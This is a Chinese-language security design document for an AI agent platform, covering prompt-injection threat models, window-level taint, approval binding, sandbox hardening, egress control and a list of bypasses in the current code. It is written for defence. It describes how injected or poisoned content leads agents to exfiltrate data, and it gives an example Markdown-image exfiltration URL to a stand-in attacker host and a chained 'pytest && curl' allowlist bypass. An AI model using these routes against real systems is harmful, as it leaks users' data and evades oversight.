# 智能体安全体系

这份文档描述安全体系本身：防谁、防什么、靠什么结构保证、接在推理循环的哪里、按什么顺序落地、怎么验收。运行时不读本文。

一句话设计：**不指望识别出每一次注入，而是让注入成功之后也拿不到东西、送不出去、留不下来。** 识别（检测面）只用来收紧，不承担边界。

## 威胁模型

### 要保护的资产

| 资产 | 例子 | 最坏后果 |
|---|---|---|
| 凭据 | 模型 API key、数据库口令、连接器 token | 被盗后长期滥用，账单与数据面全失守 |
| 他人数据 | 其它租户、其它 Work 的稿件、源材料、记忆 | 跨租户泄露 |
| 本人数据 | 当前 Work 的稿件、代码、上传材料 | 被送出去，或被不可逆地破坏 |
| 长期状态 | 记忆、技能、代理配置、命令允许名单 | 一次注入变成每一轮都生效的后门 |
| 宿主与内网 | runtime 容器、postgres、redis、model-gateway、云元数据地址 | 横向移动 |

### 攻击者

| 攻击者 | 能控制什么 | 典型手法 |
|---|---|---|
| 间接注入者（主威胁） | 被智能体读到的任何文本：上传文件、克隆的仓库、检索语料、网页、连接器返回、命令输出 | 在正文里写指令，让模型改目标、外发数据、写入记忆 |
| 恶意或好奇的用户 | 自己的消息和自己的 Work | 让智能体读别人的 Work、拿 runtime 的凭据、打内网 |
| 被投毒的供应链 | 动态工具的描述、外部技能正文、依赖包 | 工具描述里藏指令；安装后再改定义 |
| 模型自身失误 | 无 | 幻觉出破坏性命令，误删、误覆盖 |

### 假设与不覆盖

- 假设：宿主内核、容器运行时、postgres 与 API 鉴权是可信的；系统提示与平台下发的策略是可信的。
- 不覆盖：模型服务商侧的数据处理合规（属于部署选型）；用户主动把自己的数据交给智能体处理本身。
- 共用内核的沙箱（bwrap、Landlock）不足以隔离**互相敌对的租户跑任意代码**。多租户 SaaS 档位必须用 gVisor / Kata / Firecracker 这一类隔离内核的方案，见「执行隔离」。

## 核心思路

### 致命三角：每个 Turn 至少断掉一条腿

数据外泄需要同时具备三件事：能读到私有数据、上下文里有不可信内容、有对外通信的通道。检测注入是概率性的，而这三条腿可以在结构上断掉：

1. **送不出去**：执行进程无网络；出网只经具名工具和主机名单；模型输出渲染到界面时不自动拉取外部资源。
2. **拿不到**：执行进程看不到凭据、看不到其它 Work、看不到 runtime 的进程与配置。
3. **留不下来**：上下文被不可信内容污染之后，写长期状态要人确认。

结构性措施保证底线，检测与审批负责在底线之上减少误伤和打扰。

### 污点按窗口算，不按单条结果算

原设计给每条工具结果打来源标签，再判断「参数是否来自不可信来源」。这在实践中做不到：模型会改写、摘要、拼接，运行时无法可靠追踪某个参数源自哪条结果。

因此改为**窗口级污点**：本次送进模型的上下文里，只要出现过某一级来源，整个窗口就至少是那一级。模型这一步产生的所有工具调用都继承这个污点。按污点高低决定后续动作的门槛，而不是试图证明某个参数「干净」。

### 失败默认拒绝，作用在副作用上，而不是信息流入上

原设计「检测超时则不写回」会让检测服务一抖，智能体就读不了任何文件。改为：

- 依赖不可用时，**收紧后续动作**（把窗口当作最高污点），而不是丢弃内容。
- 策略读不到、沙箱起不来、审批记录对不上：**拒绝那次动作**。
- 拒绝针对的是会产生效果的那一步（写、执行、外发、持久化），读取与思考照常。

## 原则

1. **动作发生前裁决。** 在 handler 执行之前、在结果写入 `messages` 之前做决定。写进上下文的警告不算控制。
2. **结构优先于识别。** 沙箱、凭据经纪、出网名单、污点门槛是边界；检测器和「裁判模型」只能把放行收紧为确认或拒绝，永远不能把确认放宽为放行。
3. **来源由运行时写。** 来源标签按工具种类与执行条件由运行时决定，模型参数里的 `trust` 一律忽略。
4. **按可逆性定风险。** 能自动回滚的工作区写入不必打扰人；不可逆、跨会话、对外的动作才需要人确认。审批疲劳本身就是安全问题，用户会习惯性点「批准」。
5. **审批绑定到具体调用。** 人批准的是「这一个工具、这一组规范化参数、这一版策略」，执行前逐字节核对，不能被换参数或换时机复用。
6. **策略版本化，收紧立即生效。** Turn 开始时钉住策略版本，放宽要等下一个 Turn；紧急拒绝名单在下一次工具调用时就生效，不等 Turn 结束。
7. **审计是耐久事实，不是旁路日志。** 每一次裁决都能回答：谁批准的、哪版策略、当时窗口污点是什么、检测器给了什么结论。

## 架构

```text
Browser ── api（鉴权 · 审批归属校验 · 渲染安全）
             │
           runtime（编排 · 拦截网关 · 污点账本 · 写 turn_events）
             ├─ 策略面          版本化策略 + 紧急拒绝名单
             ├─ 检测面          独立服务：注入 / 动作偏离 / 持久化投毒（只收紧）
             ├─ model-gateway   只负责模型流
             ├─ sandbox 平面    唯一执行入口；独立容器、独立 uid、无凭据、网络隔离
             └─ egress 代理     具名出网工具与需要网络的执行都经过它；凭据经纪在此注入
           postgres  策略版本 · 审批记录 · turn_events（只追加）· 隔离区（加密、限期）
```

| 平面 | 职责 | 不负责 |
|---|---|---|
| 拦截网关（runtime 内） | 每次工具调用的唯一入口：注册、schema、策略、污点门槛、审批核对 | 代替沙箱 |
| 策略 | 工具、路径、命令、主机、各类动作在各污点级别下的门槛；观察或强制 | 自己跑模型 |
| 检测 | 对不可信文本和拟执行动作给出信号与建议裁决 | 放行任何东西 |
| 执行隔离 | 文件、进程、网络、资源配额 | 理解用户意图 |
| 出网与凭据 | 主机名单、方法限制、按次注入凭据 | 判断内容好坏 |
| 供应链 | 工具与技能进入名单前的检查与定义锁定 | 运行时拦截 |
| 审计 | 耐久记录每次裁决 | 替代拦截 |

所有平面共用一个裁决结构：

```text
decision:       allow | redact | deny | require_approval
reason:         短原因（面向用户可读）
sink_class:     S0..S5（见下文）
window_taint:   system | user | workspace | external
policy_version
detector:       名称与版本；未调用时为空
subject:        工具名、规范化参数的哈希与摘要
```

## 污点模型

### 来源等级

| 等级 | 内容 | 由谁判定 |
|---|---|---|
| `system` | 系统提示、平台策略、管理员安装且锁定哈希的技能 | 部署 |
| `user` | 当前会话所有者本人发出的消息 | api 鉴权后的消息来源 |
| `workspace` | 从当前 Work 根目录读到的文件；**无网络**沙箱里执行工作区代码的输出 | 运行时按工具种类 |
| `external` | 检索命中、网页与 HTTP 响应、连接器与动态工具返回、**有网络**执行的输出、未锁定的技能正文、子代理结果（取子代理窗口的最高级） | 运行时按工具种类 |

`workspace` 单列一级，是因为它由用户控制但可能夹带第三方文本（克隆的仓库、粘贴的文档）。把它和 `external` 混为一谈，编码场景几乎每一步都会被打成最高污点，所有动作都要确认，等于没有门槛。

### 传播规则

- 窗口污点 = 本次送进模型的所有消息中最高的一级。
- 压缩不洗白：摘要、折叠、截断产生的消息，继承被压缩内容的最高级。
- 子代理的结果回到父代理时，带上子代理窗口的最高级。
- 记忆被召回进上下文时，带上它入库时记录的等级。
- 只有新开会话或用户显式「清理上下文」才能降级，降级本身记审计。

工程上，`TurnState.messages` 每条消息增加运行时字段 `_taint`，不发给模型；`ContextEngine` 组窗时算出 `window_taint` 写进本步的 `TurnState`，执行器读取它。

## 动作分级与裁决

按动作的效果分级，而不是按工具名一刀切：

| 级别 | 动作 | 例子 |
|---|---|---|
| S0 读 | Work 根内读取、检索、列目录 | `read_file`、`search_sources` |
| S1 可回滚写 | Work 根内写入，且写前已有快照 | `write_file`、`edit_file`、稿件与大纲写入 |
| S2 沙箱执行 | 无网络、无凭据的沙箱里执行 | `run_command`、`run_tests` |
| S3 长期状态 | 跨 Turn 仍生效的写入 | 记忆、技能、代理配置、命令允许名单 |
| S4 对外副作用 | 携带数据出网、发消息、发布、连接器写操作、有网络的执行 | `http_fetch` 非 GET、推送、发送 |
| S5 越权 | 越出 Work 根、读凭据、提权、访问内网与元数据地址 | 任何形式 |

基线裁决矩阵（场景策略可在此之上放宽或收紧，但 S5 没有放宽通道）：

| | `system` / `user` | `workspace` | `external` |
|---|---|---|---|
| S0 | allow | allow | allow |
| S1 | allow | allow | allow；快照不可用时 require_approval |
| S2 允许名单内 | allow | allow | allow |
| S2 允许名单外 | require_approval | require_approval | require_approval |
| S3 记忆 | allow | allow，仅限本 Work 范围 | require_approval |
| S3 技能 / 配置 / 允许名单 | require_approval | require_approval | require_approval，审批卡标出污点 |
| S4 | require_approval | require_approval | require_approval，且 URL 必须已出现在上下文中（见「出网」） |
| S5 | deny | deny | deny |

几点说明：

- S1 放行的前提是可回滚：写前对 Work 做快照（工作区已有版本化时用它，否则写前把目标文件旧内容存进 checkpoint）。快照失败就降为 require_approval，而不是直接写。
- S2 允许名单内放行的前提是沙箱健康且无网络。沙箱降级或这次执行需要网络，允许名单失效，按名单外处理。
- 依赖故障时：检测不可用就把窗口当 `external`；策略不可用就拒绝 S1 及以上；沙箱不可用就拒绝 S2 和 S4 里的执行。

## 接在循环的哪里

现有循环不变：整理输入 → 组窗 → 问模型 → 跑工具（要人批准就停住）→ 存断点。安全只加在已有的门上，不另起推理循环。

### 1. 注册与暴露

- 工具经 `ToolRegistry` 注册，再由场景 profile 与阶段允许名单裁剪后进入 `tools[]`。不在名单里的工具，模型看不见，执行器也拒绝。
- 每个 `ToolSpec` 显式声明 `sink_class` 和结果的来源等级（或由执行条件决定来源等级的规则）。没有声明的工具不能注册。这取代现在只有一个布尔值的 `requires_approval`。
- 动态工具与外部技能：注册时记录定义（名称、描述、schema、正文）的哈希。之后定义一变就下线，等重新审核。工具描述本身也会被当作提示词读给模型，是注入面。

### 2. 调用前（`ToolExecutor.run`，唯一入口）

顺序固定，任何一步失败都不进 handler：

1. 工具已注册，且在本步暴露的 `tools[]` 里。
2. 参数过 JSON Schema。这一步不可关闭（现有 `tool_schema_validate` 开关只能在测试档关闭）。
3. 参数规范化：路径解析为真实路径（跟随符号链接后再判断是否在 Work 根内）、命令解析为 argv。
4. 策略按 `sink_class`、`window_taint`、规范化参数查矩阵，并查紧急拒绝名单。
5. 检测面（可选，仅 S3 / S4 或策略要求时）：动作偏离判断，只能收紧。
6. 结论为 `require_approval` 时，查有没有**与本调用匹配的审批记录**；没有就停在 `waiting_approval`。

审批记录：

```text
approval_id, turn_id, tool_call_id, tool_name,
args_hash        规范化参数的 sha256
policy_version, window_taint,
approver_user_id 由 api 校验为会话所有者或被授权者
decision, expires_at
```

- 恢复执行时，执行器核对 `args_hash` 与 `policy_version`，不匹配就重新请求审批。现有的 `force_approval=True` 旁路改为「出示审批记录」。
- 审批的免审范围只等于这一条记录。批准过一次写文件，不等于后续写文件都免审（S1 本来就不需要审批，S3 / S4 每次都要）。
- 用户可以在界面上把某条命令存为长期允许规则；这是 S3 动作，只能由用户在界面上发起，模型不能提议后自动生效。
- 审批卡必须展示：完整的规范化参数、写入的 diff、目标主机与请求方法、当前窗口污点及最近的 `external` 来源。用户看不清自己批准的是什么，审批就只是摆设。
- 审批超时等同拒绝。

### 3. 结果回到模型之前（`inject_tool_result`）

handler 返回之后、追加进 `messages` 之前：

- 运行时按工具声明打 `_taint`；结果里任何 `trust` 字段都不作数。
- 路径越出 Work 根：清空正文，状态改为错误。
- 密钥样式打码。这是兜底，凭据本不该出现在执行进程里。
- 输出大小上限：超限截断，并告诉模型被截断了。
- 检测面（`external` 内容，以及策略要求时的 `workspace` 内容）：
  - 高置信注入：正文进隔离区，模型看到的是「内容因疑似注入被隔离，已通知用户」，界面同步提示，用户可以查看并放行。
  - 其它结论：正文照常进入，检测结论写进审计，用于收紧后续动作。
  - 超时或不可用：正文照常进入，窗口按 `external` 处理。

### 4. 长期状态

- 记忆、技能正文、代理配置、命令允许名单的写入都是 S3，按矩阵处理。门槛看的是**窗口污点**，不看模型声称这段文字来自哪里。
- 每条记忆入库时记录写入时的窗口污点；召回时带回这个等级，并以「资料」而非「指令」的形式放进上下文。
- 稿件和大纲是用户可见的作品，属于 S1（可回滚），不按「检索结果」一刀切丢弃。

### 5. 子代理

子代理走同一个 `ToolExecutor` 和同一套矩阵，不能有自己的放宽。两种实现，先做简单的：

- **第一阶段**：子代理只拿 S0 / S1 / 允许名单内的 S2。其它调用直接返回错误「需要父代理执行」，由父代理在自己的 Turn 里重新发起，走正常审批。这样不需要嵌套的审批状态机。
- **第二阶段**：子代理的审批请求冒泡到父 Turn，父 Turn 的 `pending_approval` 带上 `origin: child/<id>`，批准后由 `child_join` 恢复子代理。

子代理结果回到父代理时带子代理窗口的最高污点。

### 6. 模型输出回到用户

这是原设计漏掉的外泄通道：模型把数据拼进 Markdown 图片或链接 `![](https://attacker/?d=…)`，浏览器一渲染就把数据送出去了，不经过任何工具。

- Web 渲染不自动加载模型输出里的外部图片；改为经同源代理且需点击，或者只允许名单内的域名。
- CSP：`img-src`、`connect-src`、`frame-src` 限制为同源与名单。
- 不渲染模型输出里的原始 HTML；链接显示完整目标地址。
- 对外通知（邮件、IM）同样处理。

## 执行隔离

### 部署形态

- **生产**：所有执行只走 sandbox 平面。它是独立容器，用不同的 uid，不挂任何凭据与配置文件，网络策略禁止访问 postgres、redis、model-gateway、内网网段（RFC1918）和元数据地址（如 `169.254.169.254`）。runtime 容器在编排角色下检测到没有 sandbox 平面时，拒绝执行，而不是本地兜底。
- **单机与开发**：允许 runtime 本地执行，但下面的进程级要求一条都不能少。
- **多租户 SaaS**：每个 Work（或租户）一个隔离内核的沙箱实例（gVisor / Kata / Firecracker）。bwrap 和 Landlock 共用宿主内核，内核漏洞即逃逸，只适合单租户或可信用户。

### 进程级要求（bwrap 为主，Landlock 叠加，不是二选一）

原设计写「Landlock，其次 bubblewrap」，同时要求「网络默认关闭」。这两条互相矛盾：Landlock 主要管文件系统，ABI 4 起才能限制 TCP 的 bind/connect，管不到 UDP、DNS 和 unix socket，也不提供 PID 隔离。所以应以命名空间隔离（bwrap）为主体，Landlock 作为第二层叠在里面。

| 维度 | 要求 |
|---|---|
| 命名空间 | 新的 user / pid / net / ipc / uts / mount 命名空间；`--die-with-parent`、`--new-session` |
| `/proc` | 新 pid 命名空间里新挂的 `/proc`，看不到 runtime 进程。**不能** bind 宿主的 `/proc` |
| 可见文件 | 系统路径只读；只 bind 当前 Work 根为可写；私有 `/tmp`。其它 Work、`/app`、`/data`、凭据文件一律不可见，而不只是不可写 |
| 网络 | 默认无网络。需要网络的执行（装依赖）只经 egress 代理，输出按 `external` 处理 |
| 权限 | 放弃所有 capability；`no_new_privs`；seccomp 拦截 `ptrace`、`mount`、`bpf`、`keyctl`、`perf_event_open` 等 |
| Landlock | 读限制为系统只读路径加 Work 根，写限制为 Work 根；ABI ≥ 4 时同时禁止 TCP connect |
| 资源 | cgroup 限内存、进程数、CPU；墙钟超时；输出字节上限；Work 根磁盘配额 |
| 环境变量 | 白名单，默认拒绝；`PATH` 不含 Work 根，`argv[0]` 解析为系统绝对路径 |

### 探针与 break-glass

- 启动时和定期探针检查上面每一项是否真的生效（例如在沙箱里尝试连外网、读 `/proc/1/environ`、写 Work 根之外的路径，都必须失败），结果暴露在健康检查里。
- 探针失败：拒绝执行并告警，**不降级为裸进程**，也不在强制指定的后端不可用时静默换成 `off`。
- 裸进程执行只能由部署配置显式开启（例如 `ALLOW_UNSANDBOXED_EXEC=true`，且仅限开发档），不能来自模型、单次 Turn 或运行时环境变量的默认值；每次裸执行都记审计。

## 命令允许名单

原设计「命令前缀截到第一个 shell 控制符」不够。shell 语法里能续接命令的方式远不止 `;`、`&&`、`|`、反引号、`$()`：换行、`&`、`<()`、here-doc、重定向、变量展开都可以。更根本的问题是，很多「安全的」命令本身就会执行工作区里的代码：`npm test` 跑的是 `package.json` 里模型自己能改的脚本，`pytest` 会加载 `conftest.py`，`make` 跑 `Makefile`。

所以：

- 允许名单只减少审批打扰，不提供安全保证；安全由沙箱（无网络、无凭据、看不到别人）提供。沙箱不健康时允许名单整体失效。
- 匹配在 argv 上做：`shlex` 解析，任何 token 含 shell 元字符或命令含换行即视为名单外；按 token 精确匹配前缀；名单内命令以 argv 直接执行，不经 `/bin/sh`。
- 名单外的命令（包括带管道的）可以经审批后在沙箱里用 `sh -c` 执行，这时由沙箱兜底。
- 允许名单按用户与 Work 范围存储，新增规则是 S3。

## 出网

- shell 和执行进程不出网。需要网络的能力走具名工具（检索、`http_fetch`、连接器），由策略列出允许的主机。
- 主机名单不足以防外泄：数据可以编码进 URL 的路径或查询参数里，发给名单内的主机（比如搜索引擎、可写的代码托管站点）。补充规则：
  - 默认只允许 GET，无请求体，URL 长度有上限。非 GET 或带请求体属于 S4。
  - 窗口污点为 `external` 时，`http_fetch` 的 URL 必须已原样出现在上下文中（来自用户消息或此前的工具结果），模型临时拼出来的 URL 要人确认。
  - 解析后的 IP 再校验一次，挡住指向内网的 DNS 重绑定。
- 凭据经纪：需要凭据的请求（推送、连接器 API）由 egress 代理按主机注入认证头。凭据不出现在提示词、工具参数、执行进程的环境与文件里，模型和执行进程都接触不到。

## 检测面

检测面是独立服务，不持有 Turn 状态，不写 `messages`。它产出信号，信号只能让裁决变严。

| 输入 | 看什么 | 结论用于 |
|---|---|---|
| `external`（及策略要求的 `workspace`）工具结果 | 间接注入、伪装成指令的正文 | 高置信时隔离正文；否则记审计 |
| 拟执行的 S3 / S4 调用 + 运行时截取的用户目标 | 动作是否偏离用户授权 | allow 收紧为 require_approval 或 deny |
| 即将写入的记忆或技能 | 持久化的指令投毒 | 收紧为 require_approval |

- 动作偏离判断用检测面自己的模型或分类器。输入是运行时截取的用户原话和拟执行参数，不把可能已污染的完整历史交给它，也不让当前生成模型自评。拿不准时返回 `require_approval`。
- 同步调用有时延预算（例如 p99 300ms）；超时按「窗口视为 `external`」处理，不阻塞读取。
- 先在观察模式下标定误报。重点看情报场景：威胁情报语料本身就大量讨论注入与攻击手法，按关键词检测会大面积误报。观察模式不是防护；结构性措施在第一天就是强制的。
- 廉价规则（路径越界、密钥样式、明显的删盘和下载即执行）在 runtime 本地做，规则没命中不代表允许。

## 策略面

策略按场景（写作、编码、情报、协作）覆盖全局基线。场景可以放宽基线矩阵（例如编码场景允许更多命令进名单），但 S5 没有放宽通道，裸执行与出网名单之外的主机也只能由部署配置开启。

| 字段 | 含义 |
|---|---|
| `tools` | 允许出现在 `tools[]` 里的名字 |
| `matrix` | 各 `sink_class` 在各污点级别下的裁决，缺省继承基线 |
| `paths` | 可读、可写的根（默认只有当前 Work 根） |
| `commands` | 允许名单，argv 精确前缀 |
| `network` | 具名出网工具的主机与方法名单 |
| `memory` | 各污点级别能否写记忆、写入的范围 |
| `detectors` | 哪些检测器在哪些点同步调用、各自是观察还是强制 |
| `mode` | 整份策略处于 `observe` 还是 `enforce`；结构性措施不受此开关影响 |
| `version` | 单调递增，写进每条裁决 |

- 管控下发只生成新版本；运行中的 Turn 用开始时钉住的版本。
- 紧急拒绝名单（禁用某个工具、某个主机、某条命令）不受版本钉住，下一次工具调用即生效。

## 审计

- 真源是 `turn_events`。runtime 的数据库角色对它只有 INSERT 权限，没有 UPDATE / DELETE。
- 每次注册拒绝、调用前裁决、审批请求、审批结果、结果隔离、污点升级、沙箱探针失败、裸执行，各记一条，载荷用统一的裁决结构。
- 被隔离的原始正文不进 `turn_events`，单独存隔离区：加密、限期删除、访问需要权限并留痕。审计库不应该变成恶意载荷和泄露数据的集中仓库。
- 界面上的审批卡只是 `approval.requested` 的投影。

## 现状与差距

以下是按当前代码核对的结果，落地顺序据此排列。

| 问题 | 位置 | 风险 |
|---|---|---|
| 命令允许名单是字符串前缀匹配，`pytest && curl …` 能匹配 `pytest` | `packages/contracts/python/agent_contracts/command_allowlist.py` `command_matches_prefix` | 名单内命令可续接任意命令且免审 |
| 一次写审批后整个 Turn 的写操作都免审 | `services/runtime/app/controller/turn_controller.py`（`state.writes_preapproved = True`） | 一次批准变成整 Turn 放行 |
| `force_approval` 布尔值直接跳过审批门 | `services/runtime/app/context/engine.py` `ToolExecutor.run` | 恢复路径不核对批准的是不是这次调用 |
| 子代理工具强制 `requires_approval=False` | `services/runtime/app/tools/delegate_runner.py` `_resolve_sub_tools` | 经子代理绕过所有审批 |
| `remember` 的 `trust` 由模型参数给出，默认 `user`，只拦字面值 `retrieved` | `services/runtime/app/tools/core/memory.py`、`app/policy/inject.py` | 模型不传该参数即可把检索内容写进记忆 |
| 来源标签只给 `search_sources` 结果打，且写在结果正文里给模型看，没有执行效力 | `app/policy/inject.py` `inject_tool_result` | 污点没有被任何门槛使用 |
| 沙箱探测失败自动降为 `off`，经 `/bin/sh -c` 裸执行并保留宿主网络；强制指定后端不可用时也降为 `off` | `app/tools/core/sandbox.py` `resolve_sandbox_backend`、`app/tools/core/shell.py` | 沙箱失效时静默放开 |
| Landlock 后端对整个 `/` 授予读与执行，且不限网络 | `app/tools/core/landlock_fs.py` `apply_landlock_fs` | 能读其它 Work、`/app` 配置，并能外发 |
| bwrap 后端 bind 宿主 `/proc`、不建新 pid 命名空间，日常 Turn 默认有网络 | `app/tools/core/sandbox.py` `build_bwrap_argv` | 同 uid 下可读 runtime 进程的 `/proc/<pid>/environ`，环境变量里的凭据可被读取后外发 |
| 日常 Turn 默认保留宿主网络，只有评测档关网 | `app/settings.py` `ops_eval_deny_network`、`app/tenant_context.py` `sandbox_network_allowed` | 致命三角的「送出去」这条腿常开 |
| 评测档通过 `ops_eval` 直接跳过审批 | `ToolExecutor.run` | 应改为独立策略档，而不是执行器里的特判 |

## 落地顺序

每一步都接在现有的门上，不新开循环；每一步都有可自动化的验收用例。

**P0：堵住现有绕过（纯 runtime 改动，不依赖新服务）**

- 命令名单改为 argv 精确匹配，名单内以 argv 执行；含元字符即为名单外。
- 去掉 `writes_preapproved` 粘性放行；`force_approval` 改为核对审批记录（`args_hash` + `policy_version`）。
- 子代理按第一阶段方案收窄工具集，不再关闭审批。
- `remember` 忽略 `trust` 参数，改由窗口污点决定（P0 先用「本 Turn 是否调用过检索 / 外部工具」近似窗口污点）。
- 沙箱：去掉自动降级到 `off`；bwrap 加 `--unshare-all`、新 `/proc`、`--cap-drop ALL`，日常 Turn 默认 `--unshare-net`；Landlock 的读范围收窄到系统路径加 Work 根，并改为叠加在 bwrap 里。
- Web 渲染：外部图片不自动加载，加 CSP。
- 验收：`pytest && curl` 需审批；子代理 `write_file` 走审批或被拒；沙箱内 `cat /proc/1/environ`、读其它 Work、`curl` 外网都失败；裸执行在未开部署开关时不可能发生。

**P1：污点与分级**

- `ToolSpec` 增加 `sink_class` 与来源声明；消息带 `_taint`；`ContextEngine` 计算 `window_taint`（压缩继承最高级）。
- 执行器按矩阵裁决；S1 写前快照；审批卡展示 diff、污点与来源。
- 评测档改为独立策略（预批准命令集合、无网络、独立 Work），删掉执行器里的 `ops_eval` 特判。
- 审计事件与隔离区落表，`turn_events` 收为只追加。
- 验收：读过检索结果后 `remember` 需审批；编码场景里常规的读、改、跑测试不弹审批；压缩后污点不下降。

**P2：执行与出网收口**

- 生产只走 sandbox 平面，网络策略封内网与元数据地址；runtime 无平面时拒绝执行。
- egress 代理与具名出网工具：主机与方法名单、`external` 污点下的 URL 来源校验、DNS 重绑定防护。
- 凭据经纪：推送与连接器凭据只在代理侧注入。
- 动态工具与技能锁定定义哈希，变更即下线。
- 多租户档位接入隔离内核沙箱。
- 验收：沙箱内任何方式访问 postgres、redis、元数据地址失败；在 `external` 污点下拼接新 URL 外发需审批；工具描述被改后自动下线。

**P3：检测面**

- 先观察模式标定误报（尤其情报语料），再对 `external` 结果开启高置信隔离。
- 对 S3 / S4 接入动作偏离判断，只收紧。
- 验收：误报率与时延达到预算；检测服务宕机时读取不中断，只是后续动作变严。

## 验证与度量

- **红队回归集**：把间接注入用例（参考 AgentDojo、InjecAgent 一类基准的构造方式）做成评测场景，覆盖：文件里藏指令外发、检索语料投毒记忆、工具描述投毒、Markdown 图片外泄、子代理绕过、命令续接。每次改动跑一遍，成功率必须为零的项（外发、跨 Work 读取、凭据读取）作为发布门槛。
- **沙箱逃逸用例**：每个部署档位的探针用例纳入 CI。
- **可用性度量**：每个 Turn 的审批次数、审批通过率、平均等待时长。通过率长期接近 100% 说明门槛设错了地方，用户在机械点击。
- **检测度量**：各场景误报率、漏报率、p99 时延、超时率。

## 已知残余风险

- 注入仍可能让模型在当前 Work 内做坏事（改坏代码、写错稿件）。S1 的快照保证能回滚，但不能保证用户一定发现。
- 用户在审批卡上批准了一个恶意动作。审批卡的信息展示是唯一缓解手段。
- 共用内核的沙箱面临内核漏洞。按部署档位选择隔离强度。
- 允许名单内的命令会执行工作区代码；它们的安全完全依赖沙箱。

## 不做的事

- 不把安全做成模型可关的旁路，也不靠系统提示里的「请勿……」代替拒绝。
- 不用正在生成的那只模型做唯一安全裁判；检测结论不能放宽任何裁决。
- 不在规则没命中时默认允许命令、出网或写记忆。
- 不把观察模式的日志当作已经拦截。
- 不因为依赖故障就降级为裸执行或放开网络。
